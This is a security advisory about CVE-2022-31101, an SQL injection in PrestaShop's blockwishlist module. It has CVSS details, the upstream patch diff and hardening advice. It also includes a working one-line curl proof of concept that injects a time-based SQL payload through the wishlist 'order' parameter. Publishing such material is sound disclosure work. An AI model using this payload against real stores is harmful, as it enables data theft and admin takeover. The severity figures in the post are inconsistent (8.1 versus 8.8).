---
layout: post
title: "[CVE-2022-31101] Invalid order neutralization in an SQL query in PrestaShop blockwishlist module"
categories: modules
author:
- Friends-Of-Presta.org
meta: "CVE,PrestaShop,blockwishlist"
severity: "high (8.1)"
---

**blockwishlist** is a prestashop extension which adds a block containing the customer's wishlists. In affected versions an authenticated customer can perform SQL injection. This issue is fixed in version 2.1.1. Users are advised to upgrade. There are no known workarounds for this issue. 

## Summary

* **CVE ID**: [CVE-2022-31101](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31101)
* **Published at**: 2022-06-24
* **Advisory source**: PrestaShop
* **Vendor**: PrestaShop
* **Product**: blockwishlist
* **Impacted release**: >=2.0.0, 2.1.1
* **Product author**: PrestaShop
* **Weakness**: [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
* **Severity**: high (8.8)

## Description

An authenticated customer can perform SQL injection.


## CVSS base metrics

* **Attack vector**: network
* **Attack complexity**: low
* **Privilege required**: low
* **User interaction**: none
* **Scope**: unchanged
* **Confidentiality**: high
* **Integrity**: high
* **Availability**: high

**Vector string**: [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

## Possible malicious usage

Technical and personal data leaks
Obtain admin access
Remove all data of the linked PrestaShop

## Proof of concept

Based on this [POC](https://packetstormsecurity.com/files/168003/Prestashop-Blockwishlist-2.1.0-SQL-Injection.html)

```bash
curl -v 'http://website.com/module/blockwishlist/view?id_wishlist=1&order=product.name%2C%20%28select%20case%20when%20%28id_customer%3D1%29%20then%20%28SELECT%20SLEEP%287%29%29%20else%201%20end%20from%20ps_customer%20where%20id_customer%3D1%29%3B%20--.asc'
```


## Patch of release 2.1.0 to 2.1.1

Issue is fixed in 2.1.1 in this [patch](https://github.com/PrestaShop/blockwishlist/commit/b3ec4b85af5fd73f74d55390b226d221298ca084)

```diff
--- a/src/Search/WishListProductSearchProvider.php
+++ b/src/Search/WishListProductSearchProvider.php
@@ -35,6 +35,7 @@ use PrestaShop\PrestaShop\Core\Product\Search\SortOrderFactory;
 use Product;
 use Shop;
 use Symfony\Component\Translation\TranslatorInterface;
+use Validate;
 use WishList;
 
 /**
@@ -167,7 +168,10 @@ class WishListProductSearchProvider implements ProductSearchProviderInterface
 
         if ('products' === $type) {
             $sortOrder = $query->getSortOrder()->toLegacyOrderBy(true);
-            $querySearch->orderBy($sortOrder . ' ' . $query->getSortOrder()->toLegacyOrderWay());
+            $sortWay = $query->getSortOrder()->toLegacyOrderWay();
+            if (Validate::isOrderBy($sortOrder) && Validate::isOrderWay($sortWay)) {
+                $querySearch->orderBy($sortOrder . ' ' . $sortWay);
+            }
             $querySearch->limit((int) $query->getResultsPerPage(), ((int) $query->getPage() - 1) * (int) $query->getResultsPerPage());
             $products = $this->db->executeS($querySearch);
```


## Other recommandations

* It’s recommended to upgrade to the lastest version of the module **blockwishlist** up to 2.1.1.

Please note, blockwishlist is often forked to be custumized.

* Upgrade PrestaShop beyong 1.7.8.8 (and 8.0.1) to disable multiquery executions (separated by ";").
* Change the default database prefix `ps_` by a new longer arbitrary prefix. Nethertheless, be warned that this is useless against blackhat with DBA senior skilled because of a design vulnerability in DBMS
* Activate OWASP 942's rules on your WAF (Web application firewall), be warned that you will probably break your backoffice and you will need to pre-configure some bypasses against these set of rules.

## Links

* [PrestaShop product repository](https://github.com/PrestaShop/blockwishlist/security/advisories/GHSA-2jx3-5j9v-prpp)
* [POC](http://packetstormsecurity.com/files/168003/Prestashop-Blockwishlist-2.1.0-SQL-Injection.html)
* [Patch](https://github.com/PrestaShop/blockwishlist/commit/b3ec4b85af5fd73f74d55390b226d221298ca084)

